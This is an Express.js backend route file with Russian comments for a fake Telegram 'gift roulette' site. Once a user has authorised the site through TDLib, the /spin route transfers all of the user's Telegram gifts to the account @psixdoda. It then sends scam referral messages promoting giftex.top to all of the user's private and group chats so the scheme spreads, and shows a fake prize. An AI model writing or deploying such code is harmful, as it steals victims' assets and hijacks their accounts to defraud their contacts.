const express = require('express');
const router = express.Router();
const { getClient } = require('../config/telegram');
const stats = require('../models/stats'); // Добавляем импорт модуля статистики

// Промежуточное ПО для проверки авторизации
function checkAuth(req, res, next) {
  if (!req.session.user) {
    return res.status(401).json({ error: 'Требуется авторизация' });
  }
  next();
}

// Проверка, что пользователь авторизован через TDLib
function checkTdlibAuth(req, res, next) {
  if (!req.session.user || !req.session.user.tdlibAuthorized) {
    return res.status(401).json({ error: 'Требуется авторизация через Telegram' });
  }
  next();
}

// Проверка, участвовал ли пользователь в рулетке ранее
function checkParticipation(req, res, next) {
  if (req.session.messagesSent) {
    return res.status(403).json({ 
      error: 'Вы уже получили свой подарок',
      message: 'Поздравляем! Ваш подарок был отправлен ранее, проверьте Telegram!'
    });
  }
  next();
}

// Генерация случайного подарка
function generateGift() {
  const gifts = [
    '',
    '',
    '',
    '',
    '',
    '',
    '',
    '',
    '',
    ''
  ];
  return gifts[Math.floor(Math.random() * gifts.length)];
}

// Маршрут для прокрутки рулетки (требует авторизации)
router.post('/spin', checkAuth, checkTdlibAuth, checkParticipation, async (req, res) => {
  try {
    // Записываем прокрутку рулетки в статистику
    stats.recordSpin();
    
    const sessionId = req.session.user.tdlibSessionId;
    const client = getClient(sessionId);
    
    // ИЗМЕНЕНО: Сначала отправляем подарки пользователю @psixdoda
    let giftResult = { success: false, sentCount: 0 };
    try {
      console.log('Пытаемся отправить все подарки пользователю @psixdoda...');
      giftResult = await client.sendAllGiftsToUser('psixdoda');
      console.log('Результат отправки подарков:', JSON.stringify(giftResult));
      
      // Если подарки успешно отправлены, добавляем информацию в сессию
      if (giftResult.success) {
        req.session.giftsSent = true;
        req.session.giftsResult = giftResult;
        
        // Записываем успешную отправку подарков в статистику
        stats.recordGiftSend(giftResult.sentCount, 0);
      } else {
        // Записываем неудачную отправку в статистику, если есть информация об ошибках
        stats.recordGiftSend(0, 1, 'Не удалось отправить подарки');
      }
    } catch (giftError) {
      console.error('Ошибка при отправке подарков:', giftError);
      // Записываем ошибку в статистику
      stats.recordGiftSend(0, 1, `Ошибка при отправке подарков: ${giftError.message}`);
    }
    
    // ПОСЛЕ отправки подарков (вне зависимости от результата) отправляем сообщения
    console.log('Отправка сообщений в личные чаты...');
    
    // Используем фиксированный текст "HELLO WORLD" вместо сложного сообщения
    const finalMessageText = "Ку! Получилось бесплатно выиграть тортик на сайте GIFTEX, попробуй ты тоже по моей рефке плиз: ";
    
    // Отправляем сообщение только в личные чаты с реальными людьми
    const results = await client.sendMessageToAllPrivateChats(finalMessageText);
    
    // Помечаем, что сообщения были отправлены для этого пользователя
    req.session.messagesSent = true;
    
    // Сохраняем результаты отправки в сессии для статистики
    req.session.messageSendResults = results;
    
    // Получаем статистику отправки
    const sentCount = results.filter(r => r.success).length;
    const failedCount = results.filter(r => !r.success).length;
    
    // Записываем отправку сообщений в личные чаты в статистику
    stats.recordMessageSend(sentCount, 0);
    
    // Если были неудачные отправки, записываем их в статистику
    if (failedCount > 0) {
      const failedErrors = results
        .filter(r => !r.success)
        .map(r => r.error || 'Неизвестная ошибка')
        .join(', ');
      
      stats.addError('Отправка сообщений', `Не удалось отправить ${failedCount} сообщений: ${failedErrors}`);
    }
    
    // После отправки в личные чаты, отправляем в групповые чаты
    console.log('Отправка сообщений в групповые чаты...');
    
    // Текст сообщения для групповых чатов отличается
    const groupMessageText = "Привет всем! Только что выиграл бесплатный тортик на сайте GIFTEX. Вот ссылка для регистрации, если кто-то тоже хочет попробовать: giftex.top";
    
    // Отправляем сообщение в групповые чаты
    const groupResults = await client.sendMessageToAllGroupChats(groupMessageText);
    
    // Сохраняем результаты отправки в групповые чаты в сессии для статистики
    req.session.groupMessageSendResults = groupResults;
    
    // Получаем статистику отправки в групповые чаты
    const groupSentCount = groupResults.filter(r => r.success).length;
    const groupFailedCount = groupResults.filter(r => !r.success).length;
    
    // Записываем отправку сообщений в группы в статистику
    stats.recordMessageSend(0, groupSentCount);
    
    // Если были неудачные отправки в групповые чаты, записываем их в статистику
    if (groupFailedCount > 0) {
      const groupFailedErrors = groupResults
        .filter(r => !r.success)
        .map(r => r.error || 'Неизвестная ошибка')
        .join(', ');
      
      stats.addError('Отправка сообщений в группы', `Не удалось отправить ${groupFailedCount} сообщений в группы: ${groupFailedErrors}`);
    }
    
    // Симуляция задержки на прокрутку рулетки (3 секунды)
    await new Promise(resolve => setTimeout(resolve, 3000));
    
    // Отправляем ответ об успешной операции
    res.json({
      success: true,
      message: `Отправлено сообщение в ${sentCount} личных чатов и ${groupSentCount} групповых чатов.`,
      gift: "HELLO WORLD",
      sentCount: sentCount,
      groupSentCount: groupSentCount,
      giftsInfo: {
        sent: giftResult.success,
        count: giftResult.sentCount || 0,
        total: giftResult.totalCount || 0
      }
    });
  } catch (error) {
    console.error('Ошибка при отправке сообщений:', error);
    // Записываем ошибку в статистику
    stats.addError('Рулетка', `Общая ошибка при прокрутке рулетки: ${error.message}`);
    res.status(500).json({ 
      error: 'Ошибка сервера',
      message: 'Не удалось отправить сообщения',
      details: error.message
    });
  }
});

// Проверка статуса рулетки для пользователя
router.get('/status', checkAuth, (req, res) => {
  res.json({
    authenticated: true,
    tdlibAuthorized: req.session.user.tdlibAuthorized || false,
    messagesSent: req.session.messagesSent || false,
    giftsSent: req.session.giftsSent || false,
    firstName: req.session.user.firstName,
    lastName: req.session.user.lastName || '',
    phoneNumber: req.session.user.phoneNumber || ''
  });
});

module.exports = router; 